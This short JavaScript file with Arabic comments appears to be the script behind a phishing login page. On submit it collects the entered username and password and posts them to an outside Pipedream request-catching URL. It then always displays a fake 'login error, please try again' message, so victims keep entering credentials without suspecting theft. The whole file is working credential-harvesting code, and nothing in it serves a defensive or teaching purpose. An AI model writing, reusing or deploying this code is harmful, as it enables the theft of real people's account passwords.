// معالجة إرسال النموذج
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  // جمع البيانات
  const data = {
    username: document.getElementById("username").value,
    password: document.getElementById("password").value,
  };

  try {
    // إرسال إلى Pipedream
    const response = await fetch("https://eota86rryx1zaj7.m.pipedream.net", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    // -----------------------------------------------------
    // عرض رسالة خطأ دائمًا
    document.getElementById("message").textContent =
      "حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.";
    document.getElementById("message").style.color = "red";
  } catch (error) {
    document.getElementById("message").textContent =
      "حدث خطأ في الاتصال بالخادم.";
    document.getElementById("message").style.color = "red";
  }

  
});
